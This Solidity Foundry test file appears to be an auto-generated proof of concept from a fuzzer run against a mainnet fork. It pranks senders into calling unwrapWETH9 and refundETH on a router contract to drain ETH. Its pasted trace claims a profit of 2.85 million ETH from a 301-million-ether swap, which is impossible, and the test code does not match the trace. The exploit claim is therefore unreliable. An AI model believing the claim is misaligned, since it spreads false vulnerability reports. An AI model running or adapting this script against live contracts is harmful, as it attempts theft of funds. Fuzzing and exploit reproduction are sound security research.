// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0xE592427A0AEce92De3Edee1F18E0157C05861564 -c eth --onchain-block-number 20526072 -f -i -p --onchain-etherscan-api-key $ETH_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Fund Loss]: Anyone can earn 2851598.006 ETH by interacting with the provided contracts

================ Trace ================
[38;2;205;121;221m[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   ├─[1] [38;2;0;118;255mRouter.[38;2;255;123;114mswapExactETHForTokens{value: [38;2;153;0;204m301178435.2381 ether}(0, path:(WETH → [38;2;117;108;194m0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), address(this), block.timestamp);
   └─[1] [38;2;117;108;194m0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2.[38;2;255;123;114mtransferFrom([38;2;205;121;221m0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, [38;2;134;21;100m0xE592427A0AEce92De3Edee1F18E0157C05861564, 10697)
[38;2;220;144;36m[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   ├─[1] [38;2;134;21;100m0xE592427A0AEce92De3Edee1F18E0157C05861564.[38;2;255;123;114munwrapWETH9(0, [38;2;220;144;36m0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024)
   │  ├─[2] [38;2;220;144;36m[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024.fallback()
   │  │  ├─[3] [38;2;134;21;100m0xE592427A0AEce92De3Edee1F18E0157C05861564.[38;2;255;123;114mrefundETH()
   │  │  │  ├─[4] [38;2;220;144;36m[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024.fallback()
   │  │  │  │  └─[5] [38;2;134;21;100m0xE592427A0AEce92De3Edee1F18E0157C05861564.[38;2;255;123;114mfallback()
   │  │  └─[3] [38;2;117;108;194m0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2.[38;2;255;123;114mfallback()


 */

contract CE592 is Test {
    function setUp() public {
        vm.createSelectFork("eth", 20526072);
    }

    function test() public {
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        IERC20(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd).transfer(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 301178435.2381 ether);
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).transferFrom(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, 0xE592427A0AEce92De3Edee1F18E0157C05861564, 10697);
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        I(0xE592427A0AEce92De3Edee1F18E0157C05861564).unwrapWETH9(0, 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        I(0xE592427A0AEce92De3Edee1F18E0157C05861564).refundETH();
    }

    // Stepping with return
    receive() external payable {}
}

interface I {
    function unwrapWETH9(uint256,address) external payable;
    function refundETH() external payable;
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
